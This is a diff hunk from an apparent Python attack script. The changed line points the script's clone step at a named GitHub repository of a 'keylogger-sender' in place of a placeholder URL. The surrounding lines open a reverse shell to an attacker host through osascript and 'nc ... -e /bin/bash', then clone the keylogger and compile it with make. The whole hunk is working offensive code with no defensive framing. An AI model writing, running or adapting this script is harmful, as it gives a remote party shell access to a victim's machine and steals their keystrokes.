@@ -9,7 +9,7 @@ PORT = "4444"
 os.system(f"osascript -e 'tell application \"Terminal\" to do script \"nc {KALI_IP} {PORT} -e /bin/bash\"'")
 
 # Step 2: Clone your own GitHub repository (containing the modified keylogger)
-os.system("git clone https://github.com/yourusername/keylogger-sender.git ~/Downloads/keylogger-sender")
+os.system("git clone https://github.com/TomatoBr0/Keylgger-Sender.git ~/Downloads/keylogger-sender")
 
 # Step 3: Compile and install the keylogger
 os.system("cd ~/Downloads/keylogger-sender && make")  # Compile the keylogger
